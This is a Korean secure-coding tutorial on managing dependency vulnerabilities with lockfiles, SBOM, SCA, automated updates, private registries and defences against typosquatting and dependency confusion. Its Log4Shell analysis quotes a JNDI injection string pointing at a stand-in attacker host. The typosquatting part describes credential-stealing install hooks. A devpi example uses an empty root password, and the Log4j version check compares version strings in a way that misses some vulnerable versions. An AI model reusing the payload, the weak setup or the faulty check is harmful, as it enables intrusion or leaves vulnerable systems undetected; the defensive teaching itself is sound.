---
series: secure-coding-101
episode: 9
title: "Secure Coding 101 (9/10): Dependency 취약점 관리"
status: content-ready
targets:
  tistory: true
  medium: false
  hashnode: false
  mkdocs: true
  ebook: true
language: ko
tags:
  - Dependencies
  - SCA
  - SBOM
  - SupplyChain
  - SecureCoding
seo_description: SCA, SBOM, lockfile, dependabot 그리고 안전한 dependency 관리 5단계
last_reviewed: '2026-05-15'
---

# Secure Coding 101 (9/10): Dependency 취약점 관리

우리가 운영하는 서비스 대부분은 직접 쓴 코드보다 외부 라이브러리에 더 많이 기대고 있습니다. HTTP 클라이언트, ORM, 템플릿 엔진, 인증 라이브러리, 빌드 도구까지 모두 공급망의 일부입니다. 그래서 의존성 취약점은 남의 문제처럼 보여도 실제로는 우리 서비스의 취약점이 됩니다.

이 글은 Secure Coding 101 시리즈의 9번째 글입니다.

여기서는 dependency 관리를 버전 업데이트 작업으로만 보지 않고, lockfile, SCA, SBOM, 자동 업데이트, 재현 가능한 빌드까지 포함한 공급망 보안 흐름으로 정리하겠습니다. 이 관점을 이해하면 왜 lockfile 하나가 운영 안정성과 사고 대응 속도까지 좌우하는지도 선명해집니다.

![Secure Coding 101 9장 흐름 개요](https://yeongseon-books.github.io/book-public-assets/assets/secure-coding-101/09/09-01-concept-at-a-glance.ko.png)
*Secure Coding 101 9장 흐름 개요*

## 먼저 던지는 질문

- SCA는 정확히 무엇을 검사할까요?
- SBOM은 언제 실무에서 큰 힘을 발휘할까요?
- lockfile은 왜 선택이 아니라 필수일까요?

## 왜 중요한가

Log4j, event-stream, ua-parser-js 같은 사고는 공통점이 있습니다. 우리가 취약한 코드를 직접 쓰지 않았어도 라이브러리 하나로 서비스 전체가 영향을 받았다는 사실입니다. 공급망 공격은 종종 코드 한 줄도 바꾸지 않고 들어옵니다.

이 주제가 어려운 이유는 보이지 않는 의존성이 많기 때문입니다. `requirements.txt`에 한 줄만 적어도 실제 설치되는 패키지는 훨씬 많고, 그중 상당수는 전이 의존성입니다. 무엇이 설치됐는지 모르면 무엇을 패치해야 하는지도 모르게 됩니다. 그래서 추적과 재현 가능성이 보안의 출발점이 됩니다.

## 한눈에 보는 구조

매니페스트는 원하는 패키지를 선언하고, lockfile은 실제로 설치할 정확한 버전과 해시를 고정합니다. 그 결과물을 SCA가 스캔하고, 취약점 경고는 자동 업데이트 PR과 연결됩니다. 이 흐름이 자동화돼야 공급망 위험을 계속 줄일 수 있습니다.

## 핵심 용어

- **소프트웨어 구성 분석(SCA)**: 의존성에 알려진 취약점이 있는지 검사하는 절차입니다.
- **SBOM**: 우리가 배포하는 구성 요소 전체 목록입니다.
- **lockfile**: 정확한 버전과 해시를 고정해 재현 가능한 빌드를 만드는 파일입니다.
- **버전 고정(pinning)**: 직접 의존성 버전을 명시적으로 고정하는 작업입니다.
- **전이 의존성(transitive dependency)**: 우리가 직접 추가한 패키지가 다시 끌어오는 하위 패키지입니다.

## 바꾸기 전과 후

**바꾸기 전**: `requirements.txt`에 상위 패키지 몇 개만 적어 두고 빌드할 때마다 다른 하위 버전이 들어옵니다. 무엇이 설치됐는지도, 취약한 패키지가 있는지도 금방 알기 어렵습니다.

**바꾼 후**: `uv.lock`이나 `poetry.lock`으로 버전과 해시를 고정합니다. CI는 SCA를 돌리고, 의존성 업데이트 PR이 주기적으로 들어오며, SBOM으로 구성 요소를 한눈에 파악할 수 있습니다.

## 실습: 의존성을 안전하게 관리하는 5단계

### 1단계 — lockfile을 생성합니다

```bash
uv lock          # 또는 poetry lock, pip-compile
```

lockfile이 없으면 같은 저장소에서도 빌드 시점마다 다른 패키지가 설치될 수 있습니다. 이 상태에서는 재현도 어렵고, 취약점 대응도 느려집니다. lockfile은 보안 도구이면서 운영 도구입니다.

### 2단계 — SBOM을 만듭니다

```bash
syft packages dir:. -o cyclonedx-json > sbom.json
```

SBOM은 사고가 났을 때 특히 강합니다. 특정 라이브러리에 취약점이 발표됐을 때 우리 서비스가 영향을 받는지 몇 초 안에 판단할 수 있기 때문입니다. 보안팀과 개발팀의 공용 언어가 되기도 합니다.

### 3단계 — SCA를 CI에 넣습니다

```bash
pip-audit                # Python
osv-scanner --lockfile=uv.lock   # generic
```

SCA는 알려진 CVE를 자동으로 찾아 줍니다. 중요한 점은 로컬 점검으로 끝내지 않고 CI에 넣어 계속 실행되게 만드는 것입니다. 그래야 새 취약점이 공개됐을 때 팀이 놓치지 않습니다.

### 4단계 — 업데이트를 자동화합니다

```yaml
# .github/dependabot.yml
version: 2
updates:
  - package-ecosystem: pip
    directory: "/"
    schedule:
      interval: weekly
```

업데이트를 한꺼번에 몰아서 하면 충돌과 테스트 부담이 커집니다. 주간 단위처럼 작고 자주 들어오는 PR은 검토와 병합이 쉽고, 취약점 노출 기간도 줄입니다. 공급망 보안은 영웅적 한 번보다 작은 반복이 더 효과적입니다.

### 5단계 — 설치 시 해시까지 검증합니다

```bash
pip install --require-hashes -r requirements.txt
```

버전만 고정하고 해시를 확인하지 않으면 재현 가능성이 충분하지 않을 수 있습니다. 설치 시 해시를 함께 검증하면 예상한 아티팩트만 받아 온다는 확신이 생깁니다. 보안은 결국 공급망 무결성을 지키는 문제이기도 합니다.

## 이 코드에서 먼저 볼 점

- lockfile과 해시는 재현 가능한 빌드의 중심입니다.
- SBOM은 사고 대응 속도를 높여 주는 실무 도구입니다.
- 작은 업데이트를 자주 하는 편이 큰 사고를 줄입니다.
- 전이 의존성도 직접 의존성과 같은 수준으로 관리해야 합니다.

## 실무에서 자주 헷갈리는 지점

1. **lockfile 없이 latest만 쓰는 경우**: 공급망 공격과 재현 불가 빌드에 동시에 취약합니다.
2. **SCA 결과를 무시하는 경우**: 경고가 쌓일수록 진짜 위험도 함께 묻힙니다.
3. **전이 의존성을 보지 않는 경우**: 실제 CVE 상당수가 하위 의존성에서 나옵니다.
4. **유지보수 중단 라이브러리를 계속 쓰는 경우**: 패치가 나오지 않는 채 위험만 남습니다.
5. **자동 업데이트 PR을 오래 방치하는 경우**: 한 번에 처리해야 할 양이 커져 결국 더 손대기 어려워집니다.

## 실무에서는 이렇게 봅니다

대부분의 팀은 Renovate나 Dependabot으로 주간 PR을 받고, CI에는 SCA 게이트를 붙입니다. 조직이 커질수록 빌드 산출물과 함께 SBOM을 발행해 배포 단위마다 어떤 구성 요소가 포함됐는지 남깁니다. 취약점 공지가 나오면 SBOM과 lockfile을 기준으로 영향 범위를 빠르게 판단합니다.

또한 dependency 관리에서 가장 중요한 습관 중 하나는 덜 의존하는 것입니다. 라이브러리 하나를 추가하면 기능뿐 아니라 패치 주기, 라이선스, 공급망 위험, 유지보수 책임도 함께 받아들입니다. 새 패키지를 넣을 때는 편의성만이 아니라 장기 운영 비용도 같이 봐야 합니다.

## 선임 엔지니어는 이렇게 생각합니다

- dependency도 결국 우리 코드이며 우리 책임입니다.
- lockfile 없이는 재현 가능한 운영이 어렵습니다.
- 작은 주기 업데이트가 큰 사고를 막습니다.
- SBOM은 사고 대응 도구입니다.
- 덜 의존하는 선택 자체가 보안일 때가 많습니다.

## 체크리스트

- [ ] lockfile이 커밋돼 있습니다.
- [ ] SCA가 CI에서 실행됩니다.
- [ ] 자동 업데이트 PR이 주기적으로 들어옵니다.
- [ ] SBOM이 생성되거나 발행됩니다.

## 연습 문제

1. `pip-audit` 출력 한 줄을 읽고 의미를 설명해 보세요.
2. 전이 의존성에서 시작된 실제 CVE 사례를 하나 찾아 정리해 보세요.
3. lockfile 없이 빌드할 때 생기는 위험 세 가지를 적어 보세요.

## 정리와 다음 글

의존성 취약점 관리는 업데이트 작업이 아니라 공급망을 추적하고 재현 가능한 상태로 유지하는 운영 습관입니다. 이 글에서는 lockfile, SCA, SBOM, 자동 업데이트, 해시 검증이 왜 함께 움직여야 하는지 정리했습니다.

다음 글에서는 사고가 터졌을 때 사실을 재구성하게 도와주는 마지막 주제, 안전한 로깅과 감사를 다룹니다.

## 심화 실전 노트: Log4Shell 분석, 타이포스쿼팅, 고정 전략, Private Registry 운영

### Log4Shell(CVE-2021-44228) 사례 분석

Log4Shell은 공급망 취약점이 얼마나 빠르고 넓게 퍼지는지 보여준 대표 사례입니다. Java의 logging 라이브러리 Log4j2가 JNDI lookup을 문자열 치환으로 처리한 것이 원인이었습니다.

```text
공격 흐름:
1. 공격자가 HTTP 헤더에 ${jndi:ldap://evil.com/payload} 삽입
2. 서버가 해당 헤더를 로깅
3. Log4j2가 문자열 내 ${...}를 JNDI lookup으로 해석
4. 원격 서버에서 악성 클래스를 다운로드/실행
5. 서버 완전 장악 (Remote Code Execution)

영향 범위:
- Java 기반 서비스 대부분 (Spring Boot, Elasticsearch, Kafka, Solr...)
- 직접 의존하지 않아도 전이 의존성으로 포함된 경우 다수
- 공개 후 24시간 내 대규모 스캔/공격 시작
```

이 사고에서 배울 점은 세 가지입니다:

```text
1. SBOM이 있었다면:
   - "우리 서비스 중 log4j-core 2.x를 쓰는 게 어디지?" -> 즉시 답 가능
   - SBOM 없이는 수백 개 서비스를 수동으로 확인해야 함

2. lockfile + 해시 검증이 있었다면:
   - 정확히 어떤 버전이 배포됐는지 확인 가능
   - 패치 버전으로 교체 후 해시 변경 확인으로 검증

3. SCA가 CI에 있었다면:
   - CVE 공개 직후 자동 경고 -> 즉시 대응 시작
   - 수동 모니터링 대비 대응 시간 수 시간 -> 수 분
```

```python
# Log4Shell 영향 확인 파일 예시 (Python 프로젝트의 Java 의존성 확인)
import subprocess
import json

def check_log4shell_in_sbom(sbom_path: str) -> list[dict]:
    with open(sbom_path) as f:
        sbom = json.load(f)

    vulnerable = []
    for component in sbom.get("components", []):
        name = component.get("name", "")
        version = component.get("version", "")
        if "log4j-core" in name:
            # 2.0-beta9 ~ 2.14.1이 취약
            if version.startswith("2.") and version < "2.15.0":
                vulnerable.append({
                    "name": name,
                    "version": version,
                    "fix": "upgrade to 2.17.1+",
                    "cve": "CVE-2021-44228"
                })
    return vulnerable
```

### 타이포스쿼팅(Typosquatting) 공격

패키지 이름을 살짝 바꿔 악성 코드를 배포하는 공격입니다. `requests` 대신 `reqeusts`, `python-dateutil` 대신 `python-dateutill` 같은 식입니다.

```text
실제 사례:
- PyPI: "python3-dateutil" (정상: "python-dateutil")
- npm: "crossenv" (정상: "cross-env")
- PyPI: "jeIlyfish" (정상: "jellyfish", I vs l)

공격자 전략:
1. 유사 이름 등록 -> install hook에 악성 코드 삽입
2. setup.py의 install/develop 커맨드에서 실행
3. 환경 변수, SSH 키, AWS 자격 증명 수집 -> 외부 서버로 전송
```

```python
# 타이포스쿼팅 방어 -- 설치 전 패키지명 검증 스크립트
import difflib

KNOWN_PACKAGES = [
    "requests", "flask", "django", "fastapi", "sqlalchemy",
    "pydantic", "celery", "redis", "boto3", "numpy", "pandas",
]

def check_typosquat(package_name: str, threshold: float = 0.85) -> list[str]:
    warnings = []
    for known in KNOWN_PACKAGES:
        if package_name == known:
            return []  # 정확히 일치하면 안전
        similarity = difflib.SequenceMatcher(None, package_name, known).ratio()
        if similarity >= threshold:
            warnings.append(
                f"'{package_name}'은 '{known}'과 {similarity:.0%} 유사합니다. "
                f"오타가 아닌지 확인하세요."
            )
    return warnings
```

### 버전 고정(Pinning) 전략

버전 고정은 단순히 `==`을 붙이는 것이 아닙니다. 프로젝트 성격에 따라 전략이 달라집니다.

```text
전략 비교:

1. 애플리케이션 (배포 가능한 서비스)
   -> 모든 의존성 정확히 고정 + lockfile + 해시
   -> 재현성과 안정성이 최우선
   -> requirements.txt: package==1.2.3 --hash=sha256:abc...

2. 라이브러리 (다른 프로젝트가 설치하는 패키지)
   -> 직접 의존성은 범위 지정 (>=1.2, <2.0)
   -> 사용자의 의존성 해결을 너무 제한하지 않음
   -> lockfile은 개발/테스트용으로만 유지

3. 인프라/Docker 이미지
   -> 베이스 이미지도 digest로 고정
   -> FROM python:3.12@sha256:abc123...
   -> 시스템 패키지도 버전 고정
```

```dockerfile
# Docker 빌드에서의 완전한 고정
FROM python:3.12-slim@sha256:abcdef1234567890 AS base

# 시스템 패키지도 버전 고정
RUN apt-get update && apt-get install -y --no-install-recommends \
    libpq5=15.4-0+deb12u1 \
    && rm -rf /var/lib/apt/lists/*

# Python 의존성 -- 해시 검증 포함 설치
COPY requirements.txt .
RUN pip install --no-cache-dir --require-hashes -r requirements.txt

# 멀티스테이지로 빌드 도구 제거
FROM base AS runtime
COPY --from=base /usr/local/lib/python3.12/site-packages /usr/local/lib/python3.12/site-packages
COPY . /app
```

### Private Registry 운영

조직 내부에서 Private Registry를 운영하면 외부 패키지 공급망 위험을 크게 줄일 수 있습니다.

```text
Private Registry의 역할:
1. 프록시 캐시 -- 외부 PyPI/npm 미러링, 외부 장애 시에도 빌드 가능
2. 승인 게이트 -- 보안팀이 검토한 패키지만 내부 사용 허용
3. 내부 패키지 호스팅 -- 사내 공용 라이브러리 배포
4. 감사 추적 -- 누가 어떤 패키지를 언제 다운로드했는지 기록
```

```bash
# devpi -- Python Private Registry 설정 예시
pip install devpi-server devpi-web

# 서버 시작
devpi-server --start --host 0.0.0.0 --port 3141

# upstream PyPI 미러링 설정
devpi use http://localhost:3141
devpi login root --password ""
devpi index -c prod/approved bases=root/pypi volatile=False
```

```python
# 승인된 패키지 목록 관리
APPROVED_PACKAGES = {
    "requests": {"max_version": "2.32.0", "approved_by": "security-team"},
    "flask": {"max_version": "3.1.0", "approved_by": "security-team"},
    "sqlalchemy": {"max_version": "2.0.35", "approved_by": "security-team"},
}

def validate_requirements(requirements_path: str) -> list[str]:
    violations = []
    with open(requirements_path) as f:
        for line in f:
            line = line.strip()
            if not line or line.startswith("#"):
                continue
            pkg_name = line.split("==")[0].split(">=")[0].split("<=")[0].lower()
            if pkg_name not in APPROVED_PACKAGES:
                violations.append(f"미승인 패키지: {pkg_name}")
    return violations
```

### Dependency Confusion 공격과 방어

공개 레지스트리에 내부 패키지와 같은 이름으로 악성 패키지를 등록하는 공격입니다. pip은 기본적으로 공개 PyPI를 먼저 보므로, 내부 패키지 대신 악성 공개 패키지가 설치될 수 있습니다.

```text
공격 시나리오:
1. 회사 내부에 "mycompany-utils" 패키지가 Private Registry에 있음
2. 공격자가 PyPI에 "mycompany-utils" 이름으로 악성 패키지 등록 (더 높은 버전)
3. CI 빌드 시 pip이 PyPI에서 더 높은 버전을 찾아 설치
4. 악성 코드 실행

방어:
- --index-url만 사용 (--extra-index-url 금지)
- 내부 패키지명을 PyPI에 예약 등록 (placeholder)
- lockfile에 소스 URL과 해시를 함께 고정
```

```bash
# 안전한 설정: --index-url만 사용
pip install --index-url https://devpi.internal/prod/approved/+simple/ -r requirements.txt
# --index-url은 해당 소스만 참조
# --extra-index-url은 PyPI도 함께 참조하므로 위험
```

### 취약점 대응 우선순위 결정

SCA가 수십 개의 CVE를 보고하면 어디서부터 처리할지 판단이 필요합니다. CVSS 점수만으로는 부족합니다.

```text
우선순위 결정 기준:

1. 도달 가능성(Reachability)
   - 취약 함수가 실제로 호출되는가?
   - 도달 불가능한 코드 경로의 CVE는 우선순위 하향

2. 노출 범위(Exposure)
   - 인터넷에 직접 노출된 서비스인가?
   - 외부 입력이 취약 경로에 도달할 수 있는가?

3. 익스플로잇 존재 여부
   - PoC가 공개됐는가?
   - CISA KEV(Known Exploited Vulnerabilities) 목록에 있는가?

4. 패치 가용성
   - 수정 버전이 있는가?
   - 호환성 문제 없이 업그레이드 가능한가?
```

```python
# 취약점 우선순위 자동 분류 예시
from dataclasses import dataclass
from enum import Enum

class Priority(Enum):
    CRITICAL = "P0-즉시"
    HIGH = "P1-24시간"
    MEDIUM = "P2-1주"
    LOW = "P3-다음스프린트"

@dataclass
class VulnAssessment:
    cve_id: str
    cvss_score: float
    reachable: bool
    internet_exposed: bool
    exploit_available: bool
    patch_available: bool

    def priority(self) -> Priority:
        if self.exploit_available and self.internet_exposed and self.reachable:
            return Priority.CRITICAL
        if self.reachable and self.internet_exposed:
            return Priority.HIGH
        if self.reachable and self.patch_available:
            return Priority.MEDIUM
        return Priority.LOW

# 사용 예
assessment = VulnAssessment(
    cve_id="CVE-2021-44228",
    cvss_score=10.0,
    reachable=True,
    internet_exposed=True,
    exploit_available=True,
    patch_available=True,
)
print(assessment.priority())  # P0-즉시
```

### 전이 의존성 감사와 트리 분석

직접 의존성은 5개인데 실제 설치되는 패키지가 50개인 경우는 흔합니다. 전이 의존성을 파악하지 못하면 취약점이 어디서 들어오는지 추적할 수 없습니다.

```bash
# pip 의존성 트리 확인
pip install pipdeptree
pipdeptree --warn silence

# 출력 예시:
# fastapi==0.115.0
#   - pydantic [required: >=1.7.4, installed: 2.9.0]
#     - annotated-types [required: >=0.6.0, installed: 0.7.0]
#     - pydantic-core [required: ==2.23.0, installed: 2.23.0]
#   - starlette [required: >=0.37.2, installed: 0.40.0]
#     - anyio [required: >=3.4.0, installed: 4.6.0]
#       - idna [required: >=2.8, installed: 3.10]
#       - sniffio [required: >=1.1, installed: 1.3.1]

# 특정 패키지를 누가 끌어오는지 역추적
pipdeptree --reverse --packages idna
# idna==3.10
#   - anyio==4.6.0 [requires: idna>=2.8]
#     - starlette==0.40.0 [requires: anyio>=3.4.0]
#       - fastapi==0.115.0 [requires: starlette>=0.37.2]
```

```python
# CI에서 전이 의존성 깊이 제한 검사
import json
import subprocess

def check_dependency_depth(max_depth: int = 5) -> list[str]:
    result = subprocess.run(
        ["pipdeptree", "--json"],
        capture_output=True, text=True
    )
    tree = json.loads(result.stdout)
    warnings = []

    def measure_depth(pkg, current_depth=0):
        if current_depth > max_depth:
            warnings.append(
                f"의존성 깊이 초과: {pkg['package']['package_name']} "
                f"(depth={current_depth})"
            )
            return
        for dep in pkg.get("dependencies", []):
            measure_depth(dep, current_depth + 1)

    for pkg in tree:
        measure_depth(pkg)
    return warnings
```

### 자동 업데이트 PR의 안전한 병합 전략

Dependabot/Renovate PR이 매주 들어오면 어떤 기준으로 병합할지 정해야 합니다. 무조건 병합하면 호환성 문제가 생기고, 방치하면 보안 위험이 쌓입니다.

```text
병합 전략:

1. 패치 버전 (x.y.Z) — 자동 병합 허용
   - 조건: CI 통과 + 보안 취약점 수정 포함
   - 이유: 하위 호환성 보장이 가장 강한 변경

2. 마이너 버전 (x.Y.0) — 자동 병합 + 수동 확인
   - 조건: CI 통과 + changelog 확인
   - 이유: 새 기능 추가, 드물게 동작 변경

3. 메이저 버전 (X.0.0) — 수동 검토 필수
   - 조건: 호환성 분석, 마이그레이션 가이드 확인
   - 이유: 하위 호환 보장 없음
```

```yaml
# Renovate 자동 병합 설정 예시 (renovate.json)
{
  "$schema": "https://docs.renovatebot.com/renovate-schema.json",
  "extends": ["config:recommended"],
  "packageRules": [
    {
      "matchUpdateTypes": ["patch"],
      "automerge": true,
      "automergeType": "pr",
      "requiredStatusChecks": ["ci/test", "ci/security-scan"]
    },
    {
      "matchUpdateTypes": ["minor"],
      "automerge": true,
      "automergeType": "pr",
      "stabilityDays": 3
    },
    {
      "matchUpdateTypes": ["major"],
      "automerge": false,
      "labels": ["breaking-change", "needs-review"]
    }
  ],
  "vulnerabilityAlerts": {
    "enabled": true,
    "automerge": true,
    "schedule": ["at any time"]
  }
}
```

`stabilityDays`는 새 버전이 릴리즈된 후 일정 기간 대기하는 설정입니다. 릴리즈 직후 발견되는 회귀 버그를 피할 수 있습니다.

### 라이선스 컴플라이언스 검사

의존성 관리에서 보안만큼 중요한 것이 라이선스입니다. GPL 라이브러리를 상용 서비스에 포함하면 법적 문제가 생길 수 있습니다.

```bash
# pip-licenses -- 의존성 라이선스 확인
pip install pip-licenses
pip-licenses --format=markdown --with-urls

# 출력 예시:
# | Name       | Version | License     | URL                          |
# |------------|---------|-------------|------------------------------|
# | Flask      | 3.1.0   | BSD-3       | https://flask.palletsprojects.com |
# | requests   | 2.32.0  | Apache-2.0  | https://requests.readthedocs.io  |
```

```python
# CI에서 금지 라이선스 검사
FORBIDDEN_LICENSES = {"GPL-3.0", "AGPL-3.0", "SSPL-1.0"}
ALLOWED_LICENSES = {"MIT", "BSD-2-Clause", "BSD-3-Clause", "Apache-2.0", "ISC", "PSF-2.0"}

def check_licenses(licenses_json: list[dict]) -> list[str]:
    violations = []
    for pkg in licenses_json:
        license_name = pkg.get("License", "UNKNOWN")
        if license_name in FORBIDDEN_LICENSES:
            violations.append(
                f"금지 라이선스: {pkg['Name']}=={pkg['Version']} ({license_name})"
            )
        elif license_name not in ALLOWED_LICENSES and license_name != "UNKNOWN":
            violations.append(
                f"미확인 라이선스: {pkg['Name']}=={pkg['Version']} ({license_name}) -- 법무팀 확인 필요"
            )
    return violations
```

### 의존성 최소화 원칙

가장 좋은 공급망 보안은 의존성을 줄이는 것입니다. 패키지 하나를 추가할 때마다 다음을 함께 받아들입니다:

```text
의존성 추가 비용:
- 전이 의존성 N개 추가 (각각 잠재적 취약점)
- 유지보수 상태 모니터링 의무
- 라이선스 컴플라이언스 확인
- 업데이트 PR 처리 부담
- 공급망 공격 표면 확대

추가 전 자문:
1. 이 기능을 10줄 이내로 직접 구현할 수 있는가?
2. 표준 라이브러리로 대체 가능한가?
3. 이 패키지의 마지막 릴리즈가 1년 이내인가?
4. 유지보수자가 2명 이상인가?
5. 다운로드 수와 별 수가 충분한가?
```

```python
# 의존성 건강도 체크 스크립트
import requests as http_client
from datetime import datetime, timedelta

def check_package_health(package_name: str) -> dict:
    resp = http_client.get(f"https://pypi.org/pypi/{package_name}/json")
    if resp.status_code != 200:
        return {"status": "not_found"}

    data = resp.json()
    info = data["info"]
    releases = data["releases"]

    latest_version = info["version"]
    latest_release_date = None
    if latest_version in releases and releases[latest_version]:
        latest_release_date = releases[latest_version][0]["upload_time"]

    is_maintained = False
    if latest_release_date:
        release_dt = datetime.fromisoformat(latest_release_date)
        is_maintained = (datetime.now() - release_dt) < timedelta(days=365)

    return {
        "name": package_name,
        "version": latest_version,
        "last_release": latest_release_date,
        "maintained": is_maintained,
        "license": info.get("license", "UNKNOWN"),
        "requires_python": info.get("requires_python"),
    }
```

## 처음 질문으로 돌아가기

- **SCA는 정확히 무엇을 검사할까요?**
  - SCA는 프로젝트의 직접 의존성과 전이 의존성 목록을 CVE 데이터베이스(NVD, OSV, GitHub Advisory)와 대조해 알려진 취약점이 있는지 검사합니다. Log4Shell 절에서 본 것처럼, SBOM과 결합하면 특정 CVE가 우리 서비스에 영향을 주는지 수 분 내에 판단할 수 있습니다.
- **SBOM은 언제 실무에서 큰 힘을 발휘할까요?**
  - 새 CVE가 공개됐을 때 "우리 서비스 중 영향받는 게 어디지?"라는 질문에 즉시 답할 수 있는 도구가 SBOM입니다. Log4Shell 사례에서 SBOM이 있던 팀은 수 분 내에 영향 범위를 확인한 반면, 없던 팀은 수백 개 서비스를 수동으로 뒤져야 했습니다.
- **lockfile은 왜 선택이 아니라 필수일까요?**
  - lockfile 없이는 빌드 시점마다 다른 버전이 설치될 수 있어 재현이 불가능합니다. 취약점 대응 시 "현재 배포된 정확한 버전"을 모르면 패치가 필요한지조차 판단할 수 없습니다. 해시 검증까지 포함하면 변조된 패키지 설치도 차단할 수 있습니다.

<!-- toc:begin -->
## 시리즈 목차

- [Secure Coding 101 (1/10): Secure Coding이란 무엇인가?](./01-what-is-secure-coding.md)
- [Secure Coding 101 (2/10): 입력값 검증](./02-input-validation.md)
- [Secure Coding 101 (3/10): 인증과 세션](./03-authentication-and-session.md)
- [Secure Coding 101 (4/10): 인가와 권한](./04-authorization-and-permissions.md)
- [Secure Coding 101 (5/10): 안전한 데이터 저장](./05-safe-data-storage.md)
- [Secure Coding 101 (6/10): Secret과 키 관리](./06-secret-and-key-management.md)
- [Secure Coding 101 (7/10): SQL Injection과 ORM 안전 사용](./07-sql-injection-and-orm.md)
- [Secure Coding 101 (8/10): XSS와 CSRF 방어](./08-xss-and-csrf.md)
- **Dependency 취약점 관리 (현재 글)**
- 안전한 로깅과 감사 (예정)

<!-- toc:end -->

## 참고 자료

- [OWASP — Vulnerable and Outdated Components](https://owasp.org/Top10/A06_2021-Vulnerable_and_Outdated_Components/)
- [pip-audit](https://github.com/pypa/pip-audit)
- [OSV.dev](https://osv.dev/)
- [CycloneDX SBOM](https://cyclonedx.org/)
- [PyPA — Repeatable Installs](https://pip.pypa.io/en/stable/topics/repeatable-installs/)

- [이 시리즈 예제 코드](https://github.com/yeongseon-books/book-examples/tree/main/secure-coding-101/ko)

Tags: Dependencies, SCA, SBOM, SupplyChain, SecureCoding
